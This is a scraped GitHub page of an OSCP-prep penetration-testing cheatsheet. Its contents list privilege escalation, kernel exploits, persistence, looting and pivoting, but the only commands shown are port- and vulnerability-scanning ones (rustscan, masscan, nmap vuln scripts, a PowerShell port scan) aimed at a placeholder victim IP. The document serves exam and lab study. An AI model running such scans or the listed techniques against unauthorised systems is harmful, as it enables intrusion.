sudo","anchor":"621-abusing-sudo","htmlText":"6.2.1 Abusing sudo"},{"level":3,"text":"6.2.2 Adding root user to /etc/shadow or /etc/passwd","anchor":"622-adding-root-user-to-etcshadow-or-etcpasswd","htmlText":"6.2.2 Adding root user to /etc/shadow or /etc/passwd"},{"level":3,"text":"6.2.3 Grant passwordless sudo access","anchor":"623-grant-passwordless-sudo-access","htmlText":"6.2.3 Grant passwordless sudo access"},{"level":3,"text":"6.2.4 LD_PRELOAD and LD_LIBRARY_PATH","anchor":"624-ld_preload-and-ld_library_path","htmlText":"6.2.4 LD_PRELOAD and LD_LIBRARY_PATH"},{"level":3,"text":"6.2.5 Hijacking SUID binaries","anchor":"625-hijacking-suid-binaries","htmlText":"6.2.5 Hijacking SUID binaries"},{"level":3,"text":"6.2.6 Using NFS for Privilege Escalation","anchor":"626-using-nfs-for-privilege-escalation","htmlText":"6.2.6 Using NFS for Privilege Escalation"},{"level":3,"text":"6.2.7 Using Docker for Privesc","anchor":"627-using-docker-for-privesc","htmlText":"6.2.7 Using Docker for Privesc"},{"level":3,"text":"6.2.8 Linux Kernel Exploits","anchor":"628-linux-kernel-exploits","htmlText":"6.2.8 Linux Kernel Exploits"},{"level":4,"text":"6.2.8.1 Dirty Cow","anchor":"6281-dirty-cow","htmlText":"6.2.8.1 Dirty Cow"},{"level":4,"text":"6.2.8.2 PwnKit","anchor":"6282-pwnkit","htmlText":"6.2.8.2 PwnKit"},{"level":4,"text":"6.2.8.3 Get-Rekt BPF Sign Extension LPE","anchor":"6283-get-rekt-bpf-sign-extension-lpe","htmlText":"6.2.8.3 Get-Rekt BPF Sign Extension LPE"},{"level":4,"text":"6.2.8.4 Dirty Pipe","anchor":"6284-dirty-pipe","htmlText":"6.2.8.4 Dirty Pipe"},{"level":2,"text":"6.3 Linux Persistence","anchor":"63-linux-persistence","htmlText":"6.3 Linux Persistence"},{"level":3,"text":"6.3.1 Add SSH key to authorized_keys","anchor":"631-add-ssh-key-to-authorized_keys","htmlText":"6.3.1 Add SSH key to authorized_keys"},{"level":3,"text":"6.3.2 Set SUID bit","anchor":"632-set-suid-bit","htmlText":"6.3.2 Set SUID bit"},{"level":2,"text":"6.4 Miscellaneous Linux Commands","anchor":"64-miscellaneous-linux-commands","htmlText":"6.4 Miscellaneous Linux Commands"},{"level":3,"text":"6.4.1 Awk \u0026 Sed","anchor":"641-awk--sed","htmlText":"6.4.1 Awk \u0026amp; Sed"},{"level":2,"text":"6.5 Linux Files of Interest","anchor":"65-linux-files-of-interest","htmlText":"6.5 Linux Files of Interest"},{"level":1,"text":"7 Loot","anchor":"7-loot","htmlText":"7 Loot"},{"level":2,"text":"7.1 Sensitive Files","anchor":"71-sensitive-files","htmlText":"7.1 Sensitive Files"},{"level":3,"text":"7.1.1 Sensitive Files on Linux","anchor":"711-sensitive-files-on-linux","htmlText":"7.1.1 Sensitive Files on Linux"},{"level":3,"text":"7.1.2 Sensitive Files on Windows","anchor":"712-sensitive-files-on-windows","htmlText":"7.1.2 Sensitive Files on Windows"},{"level":3,"text":"7.1.3 Sensitive Files - Generic","anchor":"713-sensitive-files---generic","htmlText":"7.1.3 Sensitive Files - Generic"},{"level":4,"text":"7.1.3.1 git repos","anchor":"7131-git-repos","htmlText":"7.1.3.1 git repos"},{"level":2,"text":"7.2 File Transfers","anchor":"72-file-transfers","htmlText":"7.2 File Transfers"},{"level":3,"text":"7.2.1 Netcat transfer","anchor":"721-netcat-transfer","htmlText":"7.2.1 Netcat transfer"},{"level":3,"text":"7.2.2 Curl transfers","anchor":"722-curl-transfers","htmlText":"7.2.2 Curl transfers"},{"level":3,"text":"7.2.3 PHP File Uploads","anchor":"723-php-file-uploads","htmlText":"7.2.3 PHP File Uploads"},{"level":3,"text":"7.2.4 PowerShell File Transfers","anchor":"724-powershell-file-transfers","htmlText":"7.2.4 PowerShell File Transfers"},{"level":3,"text":"7.2.5 Mount NFS Share","anchor":"725-mount-nfs-share","htmlText":"7.2.5 Mount NFS Share"},{"level":3,"text":"7.2.6 SMB Share","anchor":"726-smb-share","htmlText":"7.2.6 SMB Share"},{"level":3,"text":"7.2.7 FTP Server on Kali","anchor":"727-ftp-server-on-kali","htmlText":"7.2.7 FTP Server on Kali"},{"level":3,"text":"7.2.8 WebDAV","anchor":"728-webdav","htmlText":"7.2.8 WebDAV"},{"level":3,"text":"7.2.9 SSHFS","anchor":"729-sshfs","htmlText":"7.2.9 SSHFS"},{"level":3,"text":"7.2.10 Windows LOLBAS File Downloads","anchor":"7210-windows-lolbas-file-downloads","htmlText":"7.2.10 Windows LOLBAS File Downloads"},{"level":1,"text":"8 Pivoting and Redirection","anchor":"8-pivoting-and-redirection","htmlText":"8 Pivoting and Redirection"},{"level":2,"text":"8.1 SSH Tunnels","anchor":"81-ssh-tunnels","htmlText":"8.1 SSH Tunnels"},{"level":3,"text":"8.1.1 Ad Hoc SSH Port Forwards","anchor":"811-ad-hoc-ssh-port-forwards","htmlText":"8.1.1 Ad Hoc SSH Port Forwards"},{"level":3,"text":"8.1.2 SSH on Windows","anchor":"812-ssh-on-windows","htmlText":"8.1.2 SSH on Windows"},{"level":3,"text":"8.1.3 Creating restricted user for ssh port forwarding only","anchor":"813-creating-restricted-user-for-ssh-port-forwarding-only","htmlText":"8.1.3 Creating restricted user for ssh port forwarding only"},{"level":2,"text":"8.2 SOCKS Proxies and proxychains","anchor":"82-socks-proxies-and-proxychains","htmlText":"8.2 SOCKS Proxies and proxychains"},{"level":2,"text":"8.3 Bending with sshuttle","anchor":"83-bending-with-sshuttle","htmlText":"8.3 Bending with sshuttle"},{"level":2,"text":"8.4 Bending with socat","anchor":"84-bending-with-socat","htmlText":"8.4 Bending with socat"},{"level":2,"text":"8.5 Bending with netcat","anchor":"85-bending-with-netcat","htmlText":"8.5 Bending with netcat"},{"level":2,"text":"8.6 Bending with iptables","anchor":"86-bending-with-iptables","htmlText":"8.6 Bending with iptables"},{"level":2,"text":"8.7 Bending with rinetd","anchor":"87-bending-with-rinetd","htmlText":"8.7 Bending with rinetd"},{"level":2,"text":"8.8 Bending with netsh on Windows","anchor":"88-bending-with-netsh-on-windows","htmlText":"8.8 Bending with netsh on Windows"},{"level":2,"text":"8.9 Bending with chisel","anchor":"89-bending-with-chisel","htmlText":"8.9 Bending with chisel"},{"level":2,"text":"8.10 Bending with dnscat2","anchor":"810-bending-with-dnscat2","htmlText":"8.10 Bending with dnscat2"},{"level":1,"text":"9 Miscellaneous","anchor":"9-miscellaneous","htmlText":"9 Miscellaneous"},{"level":2,"text":"9.1 Port Knocking","anchor":"91-port-knocking","htmlText":"9.1 Port Knocking"},{"level":2,"text":"9.2 Convert text to Windows UTF-16 format on Linux","anchor":"92-convert-text-to-windows-utf-16-format-on-linux","htmlText":"9.2 Convert text to Windows UTF-16 format on Linux"},{"level":2,"text":"9.3 Extract UDP pcap packet payload data","anchor":"93-extract-udp-pcap-packet-payload-data","htmlText":"9.3 Extract UDP pcap packet payload data"},{"level":2,"text":"9.4 Execute Shellcode from Bash","anchor":"94-execute-shellcode-from-bash","htmlText":"9.4 Execute Shellcode from Bash"},{"level":2,"text":"9.5 Encryption","anchor":"95-encryption","htmlText":"9.5 Encryption"},{"level":3,"text":"9.5.1 Create self-signed SSL/TLS certificate","anchor":"951-create-self-signed-ssltls-certificate","htmlText":"9.5.1 Create self-signed SSL/TLS certificate"},{"level":3,"text":"9.5.2 Decrypting files with GPG","anchor":"952-decrypting-files-with-gpg","htmlText":"9.5.2 Decrypting files with GPG"},{"level":2,"text":"9.6 Validating Checksums","anchor":"96-validating-checksums","htmlText":"9.6 Validating Checksums"},{"level":2,"text":"9.7 Inspecting Files with Exiftool","anchor":"97-inspecting-files-with-exiftool","htmlText":"9.7 Inspecting Files with Exiftool"}],"lineInfo":{"truncatedLoc":"8340","truncatedSloc":"6110"},"mode":"file"},"image":false,"isCodeownersFile":null,"isPlain":false,"isValidLegacyIssueTemplate":false,"issueTemplate":null,"discussionTemplate":null,"language":"Markdown","languageID":222,"large":false,"planSupportInfo":{"repoIsFork":null,"repoOwnedByCurrentUser":null,"requestFullPath":"/camercu/oscp-prep/blob/main/CHEATSHEET.md","showFreeOrgGatedFeatureMessage":null,"showPlanSupportBanner":null,"upgradeDataAttributes":null,"upgradePath":null},"publishBannersInfo":{"dismissActionNoticePath":"/settings/dismiss-notice/publish_action_from_dockerfile","releasePath":"/camercu/oscp-prep/releases/new?marketplace=true","showPublishActionBanner":false},"rawBlobUrl":"https://github.com/camercu/oscp-prep/raw/refs/heads/main/CHEATSHEET.md","renderImageOrRaw":false,"richText":"\u003carticle class=\"markdown-body entry-content container-lg\" itemprop=\"text\"\u003e\u003cp dir=\"auto\"\u003eThis cheatsheet contains commands and short scripts that accomplish useful things for penetration testing/red teaming.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eOther great cheatsheets:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://book.hacktricks.xyz/\" rel=\"nofollow\"\u003eHackTricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets\" rel=\"nofollow\"\u003eRed Team Experiments\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/enaqx/awesome-pentest\"\u003eAwesome Penetration Testing\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e1 Scanning\u003c/h1\u003e\u003ca id=\"user-content-1-scanning\" class=\"anchor\" aria-label=\"Permalink: 1 Scanning\" href=\"#1-scanning\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e1.1 Rustscan\u003c/h2\u003e\u003ca id=\"user-content-11-rustscan\" class=\"anchor\" aria-label=\"Permalink: 1.1 Rustscan\" href=\"#11-rustscan\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eRustscan is a faster way to discover all open ports and autorun nmap to do the\nscript scanning on those ports.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"VICTIM_IP=VICTIM_IP\nsudo rustscan --ulimit 5000 -a $VICTIM_IP -- -n -Pn -sV --script \u0026quot;default,safe,vuln\u0026quot; -oA tcp-all\"\u003e\u003cpre\u003eVICTIM_IP=VICTIM_IP\nsudo rustscan --ulimit 5000 -a \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e -- -n -Pn -sV --script \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003edefault,safe,vuln\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -oA tcp-all\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e1.2 Nmap\u003c/h2\u003e\u003ca id=\"user-content-12-nmap\" class=\"anchor\" aria-label=\"Permalink: 1.2 Nmap\" href=\"#12-nmap\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf using scripts, you can get script help by \u003ccode\u003enmap --script-help=\"nfs-*\"\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# fast full TCP discovery using massscan:\nsudo masscan -p1-65535 --rate=1000 -e tun0 $VICTIM_IP | tee masscan.txt\nports=$(cat masscan.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -n | tr '\\n' ',' | sed 's/,$//')\nsudo nmap -v -n -p $ports -oA nmap/tcp-all -Pn --script \u0026quot;default,safe,vuln\u0026quot; -sV $VICTIM_IP\n\n# all TCP ports, fast discovery, then script scan:\n# verbose, no DNS resolution, fastest timing, all TCP ports, output all formats\nports=$(nmap -v -n -T4 --min-rate=1000 -p- --open --reason $VICTIM_IP | grep '^[0-9]' | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$//)\nnmap -n -v -sC -sV -Pn -p $ports -oA nmap/tcp-all $VICTIM_IP\n\n# UDP fast scan (top 100)\nsudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast $VICTIM_IP\n# top 20 UDP ports\nsudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 $VICTIM_IP\n\n# specifying safe and wildcard ftp-* scripts\n# logic: and, or, not all work. \u0026quot;,\u0026quot; is like \u0026quot;or\u0026quot;\nnmap --script=\u0026quot;safe and ftp-*\u0026quot; -v -n -p 21 -oA nmap/safe-ftp $VICTIM_IP\n\n# to get help on scripts:\nnmap --script-help=\u0026quot;ftp-*\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e fast full TCP discovery using massscan:\u003c/span\u003e\nsudo masscan -p1-65535 --rate=1000 -e tun0 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tee masscan.txt\nports=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003ecat masscan.txt \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e \u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -f 4 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -f 1 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e sort -n \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tr \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\n\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e,\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e sed \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003es/,$//\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\nsudo nmap -v -n -p \u003cspan class=\"pl-smi\"\u003e$ports\u003c/span\u003e -oA nmap/tcp-all -Pn --script \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003edefault,safe,vuln\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -sV \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e all TCP ports, fast discovery, then script scan:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e verbose, no DNS resolution, fastest timing, all TCP ports, output all formats\u003c/span\u003e\nports=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003enmap -v -n -T4 --min-rate=1000 -p- --open --reason \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e^[0-9]\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -f1 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tr \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\n\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e,\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e sed s/,$//\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\nnmap -n -v -sC -sV -Pn -p \u003cspan class=\"pl-smi\"\u003e$ports\u003c/span\u003e -oA nmap/tcp-all \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e UDP fast scan (top 100)\u003c/span\u003e\nsudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e top 20 UDP ports\u003c/span\u003e\nsudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e specifying safe and wildcard ftp-* scripts\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e logic: and, or, not all work. \",\" is like \"or\"\u003c/span\u003e\nnmap --script=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esafe and ftp-*\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -v -n -p 21 -oA nmap/safe-ftp \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to get help on scripts:\u003c/span\u003e\nnmap --script-help=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eftp-*\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eNmap Services file lists most common ports by frequency:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"cat /usr/share/nmap/nmap-services\"\u003e\u003cpre\u003ecat /usr/share/nmap/nmap-services\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThe nmap scripts are found in the directory \u003ccode\u003e/usr/share/nmap/scripts\u003c/code\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eIf you add a script to that directory (that you download from the internet, for example), then you must update the \u003ccode\u003escript.db\u003c/code\u003e by running:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"sudo nmap --script-updatedb\"\u003e\u003cpre\u003esudo nmap --script-updatedb\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e1.3 Nessus\u003c/h2\u003e\u003ca id=\"user-content-13-nessus\" class=\"anchor\" aria-label=\"Permalink: 1.3 Nessus\" href=\"#13-nessus\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFirst, manually install Nessus on Kali from the \u003ccode\u003e.deb\u003c/code\u003e file. It's not in the \u003ccode\u003eapt\u003c/code\u003e repo.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux\" rel=\"nofollow\"\u003eInstallation Instructions\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# ensure Nessus is started\nsudo systemctl start nessusd.service\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ensure Nessus is started\u003c/span\u003e\nsudo systemctl start nessusd.service\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eBrowse to \u003cstrong\u003e\u003ca href=\"https://127.0.0.1:8834\" rel=\"nofollow\"\u003ehttps://127.0.0.1:8834\u003c/a\u003e\u003c/strong\u003e and accept the self-signed SSL cert. Set up free Nessus Essentials license and complete setup prompts. Also create an admin username and password.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eCreate a New Scan, and navigate the GUI to configure it. The major scan templates are grouped under Discover, Vulnerability, and Compliance.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eNessus is slow and not allowed on the OSCP exam, so this is mostly just for awareness.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e1.4 Windows Port Scanning\u003c/h2\u003e\u003ca id=\"user-content-14-windows-port-scanning\" class=\"anchor\" aria-label=\"Permalink: 1.4 Windows Port Scanning\" href=\"#14-windows-port-scanning\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis is a way to live off the land in Windows and perform a port scan.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# perform full TCP connection to test if port open\nTest-NetConnection -Port 445 $VICTIM_IP\n\n# scanning multiple ports\n1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\u0026quot;VICTIM_IP\u0026quot;, $_)) \u0026quot;TCP port $_ is open\u0026quot;} 2\u0026gt;$null\n\n# limited ports to search\n22,25,80,135,139,445,1443,3306,3389,5432 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\u0026quot;VICTIM_IP\u0026quot;, $_)) \u0026quot;TCP port $_ is open\u0026quot;} 2\u0026gt;$null\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e perform full TCP connection to test if port open\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eTest-NetConnection\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePort \u003cspan class=\"pl-c1\"\u003e445\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e scanning multiple ports\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e..\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1024\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e {echo ((\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e Net.Sockets.TcpClient).Connect(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eVICTIM_IP\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003c/span\u003e)) \u003cspan class=\"pl-s\"\u003e\u003cspan 